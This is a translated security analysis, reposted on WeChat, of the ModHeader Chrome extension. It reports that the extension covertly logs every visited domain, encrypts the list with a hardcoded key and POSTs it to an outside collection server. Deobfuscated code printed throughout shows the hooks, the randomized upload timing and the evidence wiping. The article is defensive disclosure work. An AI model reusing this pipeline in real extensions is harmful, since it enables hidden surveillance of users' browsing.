---
title: 很多公众号博主推荐的chrome插件ModHeader被爆进行隐蔽数据窃取
url: https://mp.weixin.qq.com/s/ffkQa2ImhfhCT-tO65qVOA
source: Doonsec's feed
date: 2026-07-12
fetch_date: 2026-07-13T05:26:01.255101
---

# 很多公众号博主推荐的chrome插件ModHeader被爆进行隐蔽数据窃取

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/cBGhzWwhSAg5cgm1iaVudpsCyG28TNEyjZIzKb7GjmwnpnVovhG60d2RFTiboTQYzBdzfWUzhzWdcxAWNUOp87icNafqDo3546I8zjWicmubGicc/0?wx_fmt=jpeg)

# 很多公众号博主推荐的chrome插件ModHeader被爆进行隐蔽数据窃取

独眼情报

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_jpg/cBGhzWwhSAiarVCfwUYnZ3reCbs1r1Ye9doBxYYpntRuJp9Ku2E6W6LgAZlgkec1EgW6SzEKk1oaEG1lIJztaCobhCv7zWTZtFPecUlAYEPc/640?wx_fmt=webp&from=appmsg)

ModHeader 是一款广受欢迎的 Chrome 扩展程序，合计安装量超过 160 万次（Chrome 90 万 + Edge 70 万）。本周，Reddit 和 Hacker News 上炸开了锅，有用户发现它会向 `api.stanfordstudies.com/app/log` 回传数据。我拉取了最新版本（v7.0.17），对整个数据窃取链路做了完整的逆向工程。结果比最初报道的还要严重：AES-GCM 加密的 IndexedDB 存储、随机化的上传时间，以及数据外传后自动销毁证据。

---

## 背景

ModHeader 是一款 Chrome 扩展程序，允许用户修改 HTTP 请求和响应头、重定向 URL。开发人员和渗透测试人员广泛使用它。最初的发现由 Reddit 用户 u/veqtor 发布，他捕捉到了异常的网络请求。我想搞清楚整个数据流转链路：数据是如何被收集、存储，最终外传的。

切入点就在压缩后的后台打包文件（`background-c2ed2c3f.js`）中的一行代码：

```
globalThis.maxDomainCount=1e3;
const Qc=1,qw="https://api.stanfordstudies.com/app/log",$w=[],Yw="mod盐header";
```

像 `"api.stanfordstudies.com/app/log"` 这种字符串，根本不该出现在一个修改请求头的扩展程序里。混淆的变量名（`qw`、`Yw`、`Qc`）以及 Unicode 盐值（`盐`）都是典型的规避审查信号。

---

## 根本原因

该扩展程序内嵌了一套完整的数据窃取子系统，独立于其请求头修改功能运行。整个系统由三个核心组件构成：

### 1. 硬编码的 AES-GCM 加密密钥

```
let qo;
(async()=>{
  qo=await Ho.importKeyFromBase64("aWfU3yG_wksZaQdSnxPJBOId0cAN8KK/UIlZbli7-bE");
})().catch(console.error);
```

`importKeyFromBase64` 调用说明存在一个内嵌的 AES-GCM 密钥，用于加密数据后再外传。密钥是硬编码的，这意味着**任何拿到这段代码的人都能解密 payload**——包括网络流量分析人员和恶意攻击者。

### 2. 设备指纹（SHA-256）

```
async function sf(){
  let r=await jw(),n=await kr(`${r.fp}${Yw}`,"SHA-256",10);
  return globalThis.fp=r.fp,n
}
```

`sf()` 函数生成一个基于安装时间戳和设备属性的持久化设备指纹。`globalThis.fp` 被写入全局作用域，以便在窃取会话中复用。

### 3. 隐蔽上传端点

```
// qw = "https://api.stanfordstudies.com/app/log"
// Yw = "mod盐header" （用作 salt）
// Qc = 1 （天阈值）
```

`api.stanfordstudies.com` 域名伪装成一个合法的学术研究项目，实则是命令与控制（C2）服务器。

---

## 完整链路解析

### 第一步：劫持每个页面加载

`Jw()` 函数被注册为 `chrome.tabs.onUpdated` 监听器。每次标签页加载 URL 时，都会调用数据收集函数。

```
async function Jw(r,n,i){
  try{
    const a=sf(); // 浏览器指纹
    if($w.indexOf(a)===-1||n.status!=="loading") return;
    const u=n.url||i.url;
    if(!u) return;
    await Zw(u); // 收集 URL
  }catch(a){}
}
```

注意那个空的 `catch` 块——出错时静默吞掉，不留痕迹。

### 第二步：提取并存储域名

`Zw()` 函数从 URL 中提取域名，加密后存入 IndexedDB，并记录访问次数。

```
async function Zw(r){
  const n=af(r); // 提取域名
  if(n===globalThis.lastChangeDomain) return; // 去重：跳过连续重复的
  globalThis.lastChangeDomain=n;
  let {settingDB:i,domainDB:a,fp:u,aesIv:l}=await jw();
  let f=await Ho.encrypt(qo,n,l); // 使用 AES-GCM 加密域名
  let p=await a.get(f,0);
  await a.put(f,p+1); // 访问计数 +1
  await Qw(a,i,l); // 检查是否该上传了
}
```

每个访问过的域名都会用硬编码密钥进行 AES-GCM 加密。计数器记录每个域名被访问了多少次。

### 第三步：满足阈值即上传

`Qw()` 函数（通过 `Xw()`）根据两个条件决定是否外传数据：

```
async function Xw(r,n){
  if(!await n.get("maxDomainCountUpload")&&await r.count()>=globalThis.maxDomainCount)
    return "maxDomainCountUpload"; // 满 1000 个域名 = 强制上传
  const i=await n.get("lastUploadDate",new Date);
  const a=Za(new Date),u=Za(i);
  const l=(a-u)/(1000*60*60*24);
  if(l>=Qc) return l-Qc>0?"uploadToNow":"uploadToToday"; // 已满 1 天
}
```

**上传触发条件：**

* 你访问了 1,000 个不同的域名
* 距离上次上传已过去 24 小时

### 第四步：加密并发送

触发后，整个域名集合被序列化、AES-GCM 加密，然后 POST 到 C2 端点。

```
async function Qw(r,n,i){
  let a=await Xw(r,n);
  if(!a||a!=="uploadToNow"&&!await zw()) return;
  let u={};
  await r.cursor((E,v)=>{u[E]=v}); // 将整个数据库导出为对象
  let l=await Ho.encrypt(qo,JSON.stringify(u),i); // 全部加密
  let f=await Vw(l,2); // 带重试机制发送
  const p=new Date().toLocaleString();
  const g=await n.get("uploadRecord",{});
  if(f){
    await n.put("maxDomainCountUpload",false);
    await n.put("lastUploadDate",new Date);
    await r.clear(); // <-- 销毁证据
    g[p]=true;
  }else{
    g[p]=false;
    // ...
  }
  await n.put("uploadRecord",g);
}
```

上传成功后，`temp` IndexedDB 被清空。证据消失。

### 第五步：POST 数据包

```
async function Vw(r,n=2){
  const i=sf(); // 浏览器指纹
  const a={data:r,fp:globalThis.fp,browser:i};
  try{
    return await Gf(qw,a,n); // fetch POST 到 api.stanfordstudies.com/app/log
  }catch(u){
    return false;
  }
}

async function Gf(r,n,i=3){
  try{
    return await fetch(r,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify(n)
    });
  }catch(a){
    if(i===0) throw new Error("Max retries reached");
    await sleep(1000);
    return await Gf(r,n,i-1);
  }
}
```

最多重试 3 次，间隔 1 秒。Payload 包含加密的域名数据、持久化设备指纹和浏览器标识信息。

---

## 被窃取的数据

| 数据 | 说明 | 持久化位置 |
| --- | --- | --- |
| 所有访问过的域名 | AES-GCM 加密域名 + 访问次数 | IndexedDB `temp` 存储区 |
| 设备指纹 | 安装时间戳的 SHA-256 哈希 | IndexedDB `settings` 存储区 |
| 浏览器身份 | 用户代理 + 平台指纹（`sf()` 输出包含 navigator 属性） | 每次请求都发送 |
| 上传历史 | 带时间戳的成功/失败日志 | IndexedDB `settings` 存储区 |
| 初始化向量 | AES-GCM IV（12 字节，随机） | IndexedDB `settings` 存储区 |

---

## 隐蔽机制

### 随机化上传时间

`zw()` 函数根据每个安装实例计算一个不同的时间窗口。它取 `SHA-256(fp + "mod盐header")`，对 8 小时（28,800 秒）取模，再加上 7 小时（25,200 秒）。最终输出是用户午夜之后的 7 到 15 小时之间的随机偏移量。每个安装实例在不同的时间窗口上传。

```
async function zw(){
  let r=await kr(`${globalThis.fp}${Yw}`,"SHA-256",10); // Yw = "mod" + Unicode salt
  let n=(Number(BigInt(r)%BigInt(60*60*8))+60*60*7)/3600;
  // 结果：7 到 15 之间的随机小时数（本地时间早上 7 点到下午 3 点）
}
```

盐值 `Yw = "mod盐header"` 使用了中文字符（`盐` = "salt"），这让这段代码更难被 grep 搜到。

### 证据自毁

上传成功后，`await r.clear()` 会清空整个 IndexedDB `temp` 存储区。

### 加密传输

使用硬编码密钥的 AES-GCM 加密让 payload 在网络传输中看起来像不透明的二进制数据。网络监控看到的是随机数据块，而非域名列表。

### 静默失败

每个外传函数都用 try/catch 包裹调用，且处理程序为空。错误完全不可见。

---

## 额外追踪

该扩展程序还会向 `extensions-hub.com` 报告安装、更新和卸载事件：

```
chrome.runtime.onInstalled.addListener(async r=>{
  const n=new URL("https://www.extensions-hub.com/partners/uninstalled/?name=ModHeader");
  n.searchParams.set("product","ModHeader");
  n.searchParams.set("version",chrome.runtime.getManifest().version);
  n.searchParams.set("browser","chrome");
  chrome.runtime.setUninstallURL(n.href);
  if(r.reason==="install"){
    // 打开 extensions-hub.com/partners/installed/?name=ModHeader
  }
  if(r.reason==="update"){
    // 创建标签页打开 extensions-hub.com/partners/updated/?name=ModHeader
  }
});
```

每次更新都会打开一个 `extensions-hub.com` 的标签页，带上扩展程序版本和浏览器类型。

---

## 为什么这种模式反复出现

浏览器扩展程序是大多数组织的安全盲区。它们在用户的浏览器上下文中运行，拥有广泛的权限，而且代码静默更新。Chrome 应用商店审核流程能抓住明显的恶意软件，但混淆后的数据收集管线却经常蒙混过关——因为审核时间有限，且代码经过了压缩混淆。

硬编码 AES 密钥、随机化计时器和证据销毁这三重规避手段，与我在 Foxtopia NPM 供应链恶意软件 中记录的手段如出一辙。这里的 Unicode 盐值（`mod盐header`）也沿用了相同的混淆技术。

核心问题在于，扩展程序模型赋予了强大的能力（所有 URL 的 webRequest 权限、本地存储的 IndexedDB、网络访问），却几乎不对扩展程序实际如何使用这些能力进行运行时验证。Chrome 团队一直在推动 Manifest V3 以限制部分能力，但本次分析中的 V3 扩展表明，**V3 并不能阻止数据外传**。

另一个因素是变现压力。拥有数百万用户的免费扩展程序产生了将用户数据变现的经济激励。`api.stanfordstudies.com` 域名明显是一个伪装成学术研究项目的数据收集端点。这是一种常见套路：用加密包装数据收集、使用听起来合法的域名，然后静默收集浏览数据，最终卖给数据掮客或分析平台。

---

## 影响

安装 ModHeader 期间，你访问的每个域名都会被记录并外传。这包括企业内部域名、VPN 登录页面、云控制台和敏感应用 URL。

* 数据在传输中加密，但**服务器可以解密**。没有用户可控的密钥。
* IndexedDB 持久化意味着即使网络中断数据也会持续累积，网络恢复后继续上传。
* `extensions-hub.com` 追踪提供了额外的行为遥测数据。
* **精准定位**：这不是什么通用分析 SDK，而是一个带有反取证功能的定制化窃取管线。

---

## 披露说明

本问题尚无 CVE 编号。ModHeader 是一款通过 Chrome 应用商店分发的专有扩展程序。我分析的是该扩展的 v7.0.17 版本（CRX 构建包）。本发现基于对其后台脚本的静态分析。

本文是对 Reddit 用户 u/veqtor 最初发现（他最先捕捉到异常网络请求）的进一步深入研究。

我的建议是：**立即从浏览器中移除 ModHeader**，并向 Chrome 应用商店举报。存在不含此类基础设施的开源替代品。

---

## 时间线

| 日期 | 事件 |
| --- | --- |
| 2026-07-10 | u/veqtor 在 Reddit 上首次发现（「160 万合计安装量——著名扩展程序」帖子） |
| 2026-07-11 | 完成窃取管线的完整逆向工程 |
| 2026-07-12 | 向 Chrome 应用商店提交滥用举报。本文发布。 |

---

## 参考

* Chrome 应用商店：ModHeader
* Chrome 应用商店滥用举报
* CWE-200：敏感信息泄露
* OWASP：数据泄露
* Manifest V3 文档
* Reddit 原始发现 by u/veqtor：「16 Million Combined Installs — Famous Extension」

---

*原文作者：Yunus Aydın*
*翻译日期：2026 年 7 月 12 日*

https://aydinnyunus.github.io/2026/07/12/modheader-data-exfiltration-stanfordstudies/

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/cBGhzWwhSAhKevFPhx1jo2TZTmVnkZPtSTHXSyvCm67zJbd2zoTvExVXc7MwINpb0mEIaN7SYnFoaGVWVdn4Sndg9o5LLwgVhclUPrIpEGM/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过